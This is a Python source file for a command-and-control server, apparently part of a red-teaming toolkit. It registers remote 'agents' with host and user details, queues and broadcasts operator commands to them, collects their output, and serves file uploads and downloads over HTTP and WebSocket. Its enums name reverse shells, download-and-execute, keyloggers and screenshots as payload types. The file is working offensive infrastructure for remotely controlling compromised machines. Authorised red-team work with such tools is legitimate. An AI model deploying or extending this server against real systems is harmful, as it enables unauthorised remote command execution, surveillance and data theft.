"""
C2 Server

Central command and control server for AI-RedTeaming operations.
Supports multiple communication protocols and payload types.
"""

import asyncio
import json
import uuid
import base64
import hashlib
import logging
from typing import Dict, List, Any, Optional, Tuple, Callable
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from enum import Enum

import aiohttp
from aiohttp import web


class ProtocolType(Enum):
    HTTP = "http"
    HTTPS = "https"
    DNS = "dns"
    WEBSOCKET = "websocket"
    RAW_TCP = "raw_tcp"


class PayloadType(Enum):
    REVERSE_SHELL = "reverse_shell"
    BIND_SHELL = "bind_shell"
    DOWNLOAD_EXECUTE = "download_execute"
    COMMAND_EXECUTION = "command_execution"
    FILE_TRANSFER = "file_transfer"
    SCREENSHOT = "screenshot"
    KEYLOGGER = "keylogger"


@dataclass
class C2Command:
    """Represents a command to be executed by an agent"""
    command_id: str
    command: str
    args: List[str] = field(default_factory=list)
    timeout: int = 30
    priority: int = 0
    created_at: datetime = field(default_factory=lambda: datetime.now(timezone.utc))
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            'command_id': self.command_id,
            'command': self.command,
            'args': self.args,
            'timeout': self.timeout,
            'priority': self.priority,
            'created_at': self.created_at.isoformat()
        }


@dataclass
class C2Response:
    """Represents a response from an agent"""
    response_id: str
    command_id: str
    agent_id: str
    output: str
    exit_code: int = 0
    error: Optional[str] = None
    created_at: datetime = field(default_factory=lambda: datetime.now(timezone.utc))
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            'response_id': self.response_id,
            'command_id': self.command_id,
            'agent_id': self.agent_id,
            'output': self.output,
            'exit_code': self.exit_code,
            'error': self.error,
            'created_at': self.created_at.isoformat()
        }


@dataclass
class AgentInfo:
    """Information about a connected agent"""
    agent_id: str
    hostname: str
    ip_address: str
    os: str
    architecture: str
    user: str
    privileges: str
    first_seen: datetime
    last_seen: datetime
    active: bool = True
    protocols: List[ProtocolType] = field(default_factory=list)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            'agent_id': self.agent_id,
            'hostname': self.hostname,
            'ip_address': self.ip_address,
            'os': self.os,
            'architecture': self.architecture,
            'user': self.user,
            'privileges': self.privileges,
            'first_seen': self.first_seen.isoformat(),
            'last_seen': self.last_seen.isoformat(),
            'active': self.active,
            'protocols': [p.value for p in self.protocols]
        }


class C2Server:
    """
    Central C2 server for AI-RedTeaming operations.
    
    Features:
    - Multi-protocol support (HTTP, HTTPS, DNS, WebSocket)
    - Agent registration and management
    - Command queue and execution
    - File transfer capabilities
    - Session persistence
    - Encrypted communications
    - Load balancing
    
    Architecture:
    - Async HTTP server using aiohttp
    - WebSocket support for real-time communication
    - REST API for management
    - Task queue for command execution
    """
    
    def __init__(
        self,
        host: str = "0.0.0.0",
        port: int = 8080,
        ssl_cert: Optional[str] = None,
        ssl_key: Optional[str] = None,
        auth_token: Optional[str] = None
    ):
        """
        Initialize the C2 server.
        
        Args:
            host: Host to bind to
            port: Port to listen on
            ssl_cert: Path to SSL certificate (for HTTPS)
            ssl_key: Path to SSL private key (for HTTPS)
            auth_token: Authentication token for agents
        """
        self.host = host
        self.port = port
        self.ssl_cert = ssl_cert
        self.ssl_key = ssl_key
        self.auth_token = auth_token or self._generate_auth_token()
        
        # Agent management
        self.agents: Dict[str, AgentInfo] = {}
        self.agent_commands: Dict[str, List[C2Command]] = {}
        self.agent_responses: Dict[str, List[C2Response]] = {}
        
        # Command management
        self.command_queue: Dict[str, C2Command] = {}
        self.pending_commands: Dict[str, List[C2Command]] = {}
        
        # File management
        self.file_store: Dict[str, bytes] = {}
        
        # Server state
        self.running = False
        self.server: Optional[web.Server] = None
        self.app: web.Application = web.Application()
        
        # Configure routes
        self._configure_routes()
        
        # Configure logging
        self._configure_logging()
    
    def _generate_auth_token(self) -> str:
        """Generate a random authentication token"""
        return hashlib.sha256(uuid.uuid4().bytes).hexdigest()
    
    def _configure_logging(self):
        """Configure logging"""
        logging.basicConfig(
            level=logging.INFO,
            format='[%(asctime)s] [C2 Server] %(levelname)s: %(message)s'
        )
        self.logger = logging.getLogger('C2Server')
    
    def _configure_routes(self):
        """Configure HTTP routes"""
        # Agent routes
        self.app.router.add_post('/api/agents/register', self._handle_agent_registration)
        self.app.router.add_post('/api/agents/checkin', self._handle_agent_checkin)
        self.app.router.add_get('/api/agents/{agent_id}/commands', self._handle_get_commands)
        self.app.router.add_post('/api/agents/{agent_id}/responses', self._handle_post_response)
        
        # Command routes
        self.app.router.add_post('/api/commands', self._handle_create_command)
        self.app.router.add_get('/api/commands/{command_id}', self._handle_get_command)
        self.app.router.add_get('/api/commands', self._handle_list_commands)
        
        # File routes
        self.app.router.add_post('/api/files/upload', self._handle_file_upload)
        self.app.router.add_get('/api/files/{file_id}', self._handle_file_download)
        
        # Management routes
        self.app.router.add_get('/api/agents', self._handle_list_agents)
        self.app.router.add_get('/api/agents/{agent_id}', self._handle_get_agent)
        self.app.router.add_post('/api/agents/{agent_id}/command', self._handle_send_command)
        
        # WebSocket route
        self.app.router.add_get('/ws/agent/{agent_id}', self._handle_websocket_connection)
    
    async def start(self):
        """Start the C2 server"""
        self.logger.info(f"Starting C2 server on {self.host}:{self.port}")
        
        # Create SSL context if certificates are provided
        ssl_context = None
        if self.ssl_cert and self.ssl_key:
            import ssl
            ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            ssl_context.load_cert_chain(self.ssl_cert, self.ssl_key)
        
        # Create runner
        runner = web.AppRunner(self.app)
        await runner.setup()
        
        # Create site
        site = web.TCPSite(runner, self.host, self.port)
        if ssl_context:
            site = web.TCPSite(runner, self.host, self.port, ssl_context=ssl_context)
        
        # Start server
        await site.start()
        
        self.server = site
        self.running = True
        
        self.logger.info(f"C2 server started. Auth token: {self.auth_token[:16]}...")
        self.logger.info(f"Agent registration endpoint: http://{self.host}:{self.port}/api/agents/register")
    
    async def stop(self):
        """Stop the C2 server"""
        self.logger.info("Stopping C2 server")
        self.running = False
        
        if self.server:
            await self.server.stop()
        
        self.logger.info("C2 server stopped")
    
    async def _handle_agent_registration(self, request: web.Request) -> web.Response:
        """Handle agent registration"""
        try:
            # Verify authentication
            if not self._verify_auth(request):
                return web.json_response({'error': 'Unauthorized'}, status=401)
            
            # Parse request
            data = await request.json()
            
            # Validate required fields
            required_fields = ['hostname', 'ip_address', 'os', 'architecture', 'user']
            for field in required_fields:
                if field not in data:
                    return web.json_response({'error': f'Missing field: {field}'}, status=400)
            
            # Generate agent ID
            agent_id = str(uuid.uuid4())
            
            # Create agent info
            agent_info = AgentInfo(
                agent_id=agent_id,
                hostname=data['hostname'],
                ip_address=data['ip_address'],
                os=data['os'],
                architecture=data['architecture'],
                user=data['user'],
                privileges=data.get('privileges', 'user'),
                first_seen=datetime.now(timezone.utc),
                last_seen=datetime.now(timezone.utc),
                active=True,
                protocols=[ProtocolType.HTTP]
            )
            
            # Store agent
            self.agents[agent_id] = agent_info
            self.agent_commands[agent_id] = []
            self.agent_responses[agent_id] = []
            
            self.logger.info(f"Agent registered: {agent_id} ({data['hostname']})")
            
            # Return agent ID and next checkin interval
            return web.json_response({
                'agent_id': agent_id,
                'checkin_interval': 60,
                'message': 'Registration successful'
            })
            
        except Exception as e:
            self.logger.error(f"Agent registration error: {e}")
            return web.json_response({'error': str(e)}, status=500)
    
    async def _handle_agent_checkin(self, request: web.Request) -> web.Response:
        """Handle agent checkin"""
        try:
            # Verify authentication
            if not self._verify_auth(request):
                return web.json_response({'error': 'Unauthorized'}, status=401)
            
            # Parse request
            data = await request.json()
            agent_id = data.get('agent_id')
            
            if not agent_id or agent_id not in self.agents:
                return web.json_response({'error': 'Invalid agent ID'}, status=404)
            
            # Update agent last seen
            self.agents[agent_id].last_seen = datetime.now(timezone.utc)
            self.agents[agent_id].active = True
            
            # Check for pending commands
            pending = self.pending_commands.get(agent_id, [])
            
            self.logger.info(f"Agent checkin: {agent_id}. Pending commands: {len(pending)}")
            
            return web.json_response({
                'status': 'ok',
                'commands': [cmd.to_dict() for cmd in pending],
                'next_checkin': 60
            })
            
        except Exception as e:
            self.logger.error(f"Agent checkin error: {e}")
            return web.json_response({'error': str(e)}, status=500)
    
    async def _handle_get_commands(self, request: web.Request) -> web.Response:
        """Get commands for an agent"""
        try:
            agent_id = request.match_info['agent_id']
            
            if agent_id not in self.agents:
                return web.json_response({'error': 'Agent not found'}, status=404)
            
            # Get and clear pending commands
            commands = self.pending_commands.get(agent_id, [])
            self.pending_commands[agent_id] = []
            
            return web.json_response({
                'commands': [cmd.to_dict() for cmd in commands]
            })
            
        except Exception as e:
            self.logger.error(f"Get commands error: {e}")
            return web.json_response({'error': str(e)}, status=500)
    
    async def _handle_post_response(self, request: web.Request) -> web.Response:
        """Handle agent response"""
        try:
            agent_id = request.match_info['agent_id']
            
            if agent_id not in self.agents:
                return web.json_response({'error': 'Agent not found'}, status=404)
            
            # Parse response
            data = await request.json()
            
            # Create response object
            response = C2Response(
                response_id=str(uuid.uuid4()),
                command_id=data.get('command_id', ''),
                agent_id=agent_id,
                output=data.get('output', ''),
                exit_code=data.get('exit_code', 0),
                error=data.get('error')
            )
            
            # Store response
            if agent_id not in self.agent_responses:
                self.agent_responses[agent_id] = []
            self.agent_responses[agent_id].append(response)
            
            self.logger.info(f"Response received from {agent_id} for command {response.command_id}")
            
            return web.json_response({'status': 'ok'})
            
        except Exception as e:
            self.logger.error(f"Post response error: {e}")
            return web.json_response({'error': str(e)}, status=500)
    
    async def _handle_create_command(self, request: web.Request) -> web.Response:
        """Create a new command"""
        try:
            # Verify admin authentication
            if not self._verify_admin_auth(request):
                return web.json_response({'error': 'Unauthorized'}, status=401)
            
            # Parse request
            data = await request.json()
            
            # Validate required fields
            if 'command' not in data:
                return web.json_response({'error': 'Missing command'}, status=400)
            
            # Create command
            command = C2Command(
                command_id=str(uuid.uuid4()),
                command=data['command'],
                args=data.get('args', []),
                timeout=data.get('timeout', 30),
                priority=data.get('priority', 0)
            )
            
            # Store command
            self.command_queue[command.command_id] = command
            
            # If agent_id is specified, queue it for that agent
            if 'agent_id' in data and data['agent_id'] in self.agents:
                if data['agent_id'] not in self.pending_commands:
                    self.pending_commands[data['agent_id']] = []
                self.pending_commands[data['agent_id']].append(command)
            
            self.logger.info(f"Command created: {command.command_id}")
            
            return web.json_response({
                'command_id': command.command_id,
                'status': 'queued'
            })
            
        except Exception as e:
            self.logger.error(f"Create command error: {e}")
            return web.json_response({'error': str(e)}, status=500)
    
    async def _handle_get_command(self, request: web.Request) -> web.Response:
        """Get a specific command"""
        try:
            command_id = request.match_info['command_id']
            
            if command_id not in self.command_queue:
                return web.json_response({'error': 'Command not found'}, status=404)
            
            command = self.command_queue[command_id]
            return web.json_response(command.to_dict())
            
        except Exception as e:
            self.logger.error(f"Get command error: {e}")
            return web.json_response({'error': str(e)}, status=500)
    
    async def _handle_list_commands(self, request: web.Request) -> web.Response:
        """List all commands"""
        try:
            commands = [cmd.to_dict() for cmd in self.command_queue.values()]
            return web.json_response({'commands': commands})
        except Exception as e:
            self.logger.error(f"List commands error: {e}")
            return web.json_response({'error': str(e)}, status=500)
    
    async def _handle_file_upload(self, request: web.Request) -> web.Response:
        """Handle file upload"""
        try:
            # Verify admin authentication
            if not self._verify_admin_auth(request):
                return web.json_response({'error': 'Unauthorized'}, status=401)
            
            # Parse multipart form
            data = await request.post()
            file = data.get('file')
            
            if not file:
                return web.json_response({'error': 'No file provided'}, status=400)
            
            # Generate file ID
            file_id = str(uuid.uuid4())
            
            # Read file content
            content = file.file.read()
            
            # Store file
            self.file_store[file_id] = content
            
            self.logger.info(f"File uploaded: {file_id} ({len(content)} bytes)")
            
            return web.json_response({
                'file_id': file_id,
                'size': len(content)
            })
            
        except Exception as e:
            self.logger.error(f"File upload error: {e}")
            return web.json_response({'error': str(e)}, status=500)
    
    async def _handle_file_download(self, request: web.Request) -> web.Response:
        """Handle file download"""
        try:
            file_id = request.match_info['file_id']
            
            if file_id not in self.file_store:
                return web.json_response({'error': 'File not found'}, status=404)
            
            content = self.file_store[file_id]
            
            self.logger.info(f"File downloaded: {file_id}")
            
            return web.Response(body=content)
            
        except Exception as e:
            self.logger.error(f"File download error: {e}")
            return web.json_response({'error': str(e)}, status=500)
    
    async def _handle_list_agents(self, request: web.Request) -> web.Response:
        """List all agents"""
        try:
            agents = [agent.to_dict() for agent in self.agents.values()]
            return web.json_response({'agents': agents})
        except Exception as e:
            self.logger.error(f"List agents error: {e}")
            return web.json_response({'error': str(e)}, status=500)
    
    async def _handle_get_agent(self, request: web.Request) -> web.Response:
        """Get agent details"""
        try:
            agent_id = request.match_info['agent_id']
            
            if agent_id not in self.agents:
                return web.json_response({'error': 'Agent not found'}, status=404)
            
            agent = self.agents[agent_id]
            
            # Include command and response counts
            agent_data = agent.to_dict()
            agent_data['command_count'] = len(self.pending_commands.get(agent_id, []))
            agent_data['response_count'] = len(self.agent_responses.get(agent_id, []))
            
            return web.json_response(agent_data)
            
        except Exception as e:
            self.logger.error(f"Get agent error: {e}")
            return web.json_response({'error': str(e)}, status=500)
    
    async def _handle_send_command(self, request: web.Request) -> web.Response:
        """Send a command to a specific agent"""
        try:
            # Verify admin authentication
            if not self._verify_admin_auth(request):
                return web.json_response({'error': 'Unauthorized'}, status=401)
            
            agent_id = request.match_info['agent_id']
            
            if agent_id not in self.agents:
                return web.json_response({'error': 'Agent not found'}, status=404)
            
            # Parse request
            data = await request.json()
            
            # Create command
            command = C2Command(
                command_id=str(uuid.uuid4()),
                command=data.get('command', ''),
                args=data.get('args', []),
                timeout=data.get('timeout', 30),
                priority=data.get('priority', 0)
            )
            
            # Queue command for agent
            if agent_id not in self.pending_commands:
                self.pending_commands[agent_id] = []
            self.pending_commands[agent_id].append(command)
            
            self.logger.info(f"Command sent to {agent_id}: {command.command_id}")
            
            return web.json_response({
                'command_id': command.command_id,
                'status': 'queued'
            })
            
        except Exception as e:
            self.logger.error(f"Send command error: {e}")
            return web.json_response({'error': str(e)}, status=500)
    
    async def _handle_websocket_connection(self, request: web.Request) -> web.WebSocketResponse:
        """Handle WebSocket connection"""
        try:
            agent_id = request.match_info['agent_id']
            
            if agent_id not in self.agents:
                return web.json_response({'error': 'Agent not found'}, status=404)
            
            # Verify authentication from query params
            token = request.query.get('token')
            if token != self.auth_token:
                return web.json_response({'error': 'Unauthorized'}, status=401)
            
            # Create WebSocket response
            ws = web.WebSocketResponse(protocols=('c2-protocol',))
            await ws.prepare(request)
            
            self.logger.info(f"WebSocket connection established: {agent_id}")
            
            # Handle WebSocket messages
            async for msg in ws:
                if msg.type == aiohttp.WSMsgType.TEXT:
                    try:
                        data = json.loads(msg.data)
                        
                        # Handle different message types
                        if data.get('type') == 'checkin':
                            # Send pending commands
                            pending = self.pending_commands.get(agent_id, [])
                            await ws.send_json({
                                'type': 'commands',
                                'commands': [cmd.to_dict() for cmd in pending]
                            })
                            self.pending_commands[agent_id] = []
                        
                        elif data.get('type') == 'response':
                            # Store response
                            response = C2Response(
                                response_id=str(uuid.uuid4()),
                                command_id=data.get('command_id', ''),
                                agent_id=agent_id,
                                output=data.get('output', ''),
                                exit_code=data.get('exit_code', 0),
                                error=data.get('error')
                            )
                            if agent_id not in self.agent_responses:
                                self.agent_responses[agent_id] = []
                            self.agent_responses[agent_id].append(response)
                            
                            await ws.send_json({'type': 'ack', 'response_id': response.response_id})
                        
                    except Exception as e:
                        self.logger.error(f"WebSocket message error: {e}")
                        await ws.send_json({'type': 'error', 'message': str(e)})
                
                elif msg.type == aiohttp.WSMsgType.ERROR:
                    self.logger.error(f"WebSocket connection closed with exception: {ws.exception()}")
            
            self.logger.info(f"WebSocket connection closed: {agent_id}")
            return ws
            
        except Exception as e:
            self.logger.error(f"WebSocket connection error: {e}")
            return web.json_response({'error': str(e)}, status=500)
    
    def _verify_auth(self, request: web.Request) -> bool:
        """Verify agent authentication"""
        # Check for token in headers or query params
        token = request.headers.get('X-Auth-Token')
        if not token:
            token = request.query.get('token')
        
        return token == self.auth_token
    
    def _verify_admin_auth(self, request: web.Request) -> bool:
        """Verify admin authentication"""
        # In production, this would check for admin token
        # For now, we'll use the same token
        return self._verify_auth(request)
    
    def get_agent(self, agent_id: str) -> Optional[AgentInfo]:
        """Get agent by ID"""
        return self.agents.get(agent_id)
    
    def get_agents(self) -> List[AgentInfo]:
        """Get all agents"""
        return list(self.agents.values())
    
    def send_command(self, agent_id: str, command: str, args: List[str] = None) -> Optional[C2Command]:
        """Send a command to an agent"""
        if agent_id not in self.agents:
            return None
        
        cmd = C2Command(
            command_id=str(uuid.uuid4()),
            command=command,
            args=args or [],
            timeout=30,
            priority=0
        )
        
        if agent_id not in self.pending_commands:
            self.pending_commands[agent_id] = []
        self.pending_commands[agent_id].append(cmd)
        
        return cmd
    
    def broadcast_command(self, command: str, args: List[str] = None) -> Dict[str, C2Command]:
        """Broadcast a command to all agents"""
        results = {}
        
        for agent_id in self.agents:
            cmd = self.send_command(agent_id, command, args)
            if cmd:
                results[agent_id] = cmd
        
        return results
    
    def get_responses(self, agent_id: str) -> List[C2Response]:
        """Get responses from an agent"""
        return self.agent_responses.get(agent_id, [])
    
    def get_all_responses(self) -> List[C2Response]:
        """Get all responses from all agents"""
        all_responses = []
        for responses in self.agent_responses.values():
            all_responses.extend(responses)
        return all_responses
